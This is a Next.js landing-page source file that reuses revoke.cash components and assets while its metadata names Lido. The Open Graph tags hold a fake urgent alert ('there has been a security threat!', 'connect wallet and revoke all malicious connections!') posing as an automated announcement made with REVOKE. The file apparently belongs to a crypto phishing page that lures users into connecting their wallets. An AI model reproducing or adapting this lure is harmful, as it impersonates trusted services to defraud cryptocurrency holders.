import HeroSection from 'components/landing/HeroSection';
import HowTo from 'components/landing/HowTo';
import LandingPageFaq from 'components/landing/LandingPageFaq';
import Sponsors from 'components/landing/Sponsors';
import WhyRevokeCash from 'components/landing/WhyRevokeCash';
import LandingLayout from 'layouts/LandingLayout';
import type { NextPage } from 'next';
import useTranslation from 'next-translate/useTranslation';
import Head from 'next/head';

const LandingPage: NextPage = () => {
  const { t } = useTranslation();

  return (
    <>
      {/* <NextSeo
        {...defaultSEO}
        // site_name = ""
        // title={t('common:meta.title')}
        // description={t('common:meta.description', { chainName: 'Ethereum' })}
      /> */}
      <Head>
        <meta
          property="description"
          content="Lido is a liquid staking solution for Ethereum (ETH), Solana (SOL) and Polygon (MATIC)."
        />
        <meta property="og:type" content="article" />
        <meta property="og:title" content=" ⏳secure your assets now  " />
        <meta property="og:site_name" content="This is an automatically generated announcement message" />
        <meta
          property="og:description"
          content="


🚨there has been a security threat!


⚡️connect wallet and revoke all malicious connections!


🤝 𝘢 𝘤𝘰𝘭𝘭𝘢𝘣𝘰𝘳𝘢𝘵𝘪𝘰𝘯 𝘸𝘪𝘵𝘩 𝘙𝘌𝘝𝘖𝘒𝘌 𝘵𝘰 𝘴𝘵𝘰𝘱 𝘵𝘩𝘳𝘦𝘢𝘵𝘴 𝘵𝘰 𝘤𝘶𝘴𝘵𝘰𝘮𝘦𝘳 𝘸𝘢𝘭𝘭𝘦𝘵𝘴"
        />
        {/* <meta property="og:url" content="https://lido.fi" /> */}
        <meta property="og:image" content="https://revoke.cash/assets/images/revoke-og-image.jpg" />
      </Head>
      {/* <LogoJsonLd logo="https://revoke.cash/assets/images/revoke-icon.svg" url="https://revoke.cash" /> */}
      <LandingLayout>
        <div className="flex flex-col items-center gap-8">
          <HeroSection />
          <HowTo />
          <WhyRevokeCash />
          <LandingPageFaq />
          <Sponsors />
        </div>
      </LandingLayout>
    </>
  );
};

export default LandingPage;
